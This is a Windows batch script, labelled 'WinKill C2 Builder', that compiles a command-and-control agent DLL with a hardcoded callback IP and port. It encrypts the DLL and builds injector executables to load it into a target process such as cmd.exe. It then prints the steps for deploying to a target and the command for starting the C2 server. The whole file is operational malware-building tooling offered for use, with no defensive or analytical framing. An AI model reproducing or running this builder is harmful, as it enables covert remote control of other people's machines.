@echo off
set IP=192.168.102.167
set PORT=4444
if not "%1"=="" set IP=%1
if not "%2"=="" set PORT=%2
for /f "usebackq" %%i in (`powershell -c "$b=[Net.IPAddress]::Parse('%IP%').GetAddressBytes();'0x{0:X8}' -f ($b[0] -bor ($b[1] -shl 8) -bor ($b[2] -shl 16) -bor ($b[3] -shl 24))"`) do set IPHEX=%%i
echo ============================================
echo   WinKill C2 Builder - C2: %IP%:%PORT%
echo ============================================
echo [1/5] agent.dll...
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.dll agent_source.c -lws2_32 || goto :err
echo [2/5] encrypt.exe...
gcc -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c || goto :err
echo [3/5] agent.dll.enc...
encrypt.exe agent.dll || goto :err
echo [4/5] injector_enc.exe...
gcc -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c || goto :err
echo [5/5] injector.exe (backup)...
gcc -O2 -s -m64 -fno-ident -o injector.exe injector_source.c || goto :err
echo.
echo Done! Target deploy:
echo   injector_enc.exe agent.dll.enc cmd.exe
echo.
echo Server:
echo   python c2_server.py 0.0.0.0 %PORT%
goto :end
:err
echo BUILD FAILED! Install MinGW-w64: https://winlibs.com/
:end
